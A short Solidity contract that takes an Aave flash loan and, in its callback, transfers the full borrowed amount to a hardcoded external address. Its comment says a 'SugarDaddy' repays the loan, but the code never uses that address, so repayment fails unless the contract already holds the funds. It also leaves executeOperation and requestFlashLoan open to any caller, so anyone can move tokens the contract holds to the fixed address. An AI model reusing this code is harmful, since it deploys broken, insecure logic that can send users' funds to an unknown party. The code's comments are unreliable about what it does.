// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAavePool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;

    function repay(
        address asset,
        uint256 amount,
        uint256 rateMode,
        address onBehalfOf
    ) external returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IFlashLoanSimpleReceiver {
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

contract SugarBaby is IFlashLoanSimpleReceiver {
    IAavePool public aavePool;
    address public sugarDaddy;

    event TransferExecuted(address indexed to, uint256 amount);

    constructor(address _pool, address _sugarDaddy) {
        aavePool = IAavePool(_pool);
        sugarDaddy = _sugarDaddy;
    }

    function requestFlashLoan(address asset, uint256 amount) external {
        aavePool.flashLoanSimple(
            address(this),
            asset,
            amount,
            abi.encode(asset, amount),
            0
        );
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata /* params */
    ) external override returns (bool) {
        address to = 0x8257568D001c936e3155f5509e1B986eFbb29451;

        // Enviar el préstamo a la dirección objetivo
        IERC20(asset).transfer(to, amount);

        // Emitir evento para transparencia
        emit TransferExecuted(to, amount);

        // Aprobar el repago del préstamo más intereses por parte de SugarDaddy
        IERC20(asset).approve(address(aavePool), amount + premium);

        return true;
    }
}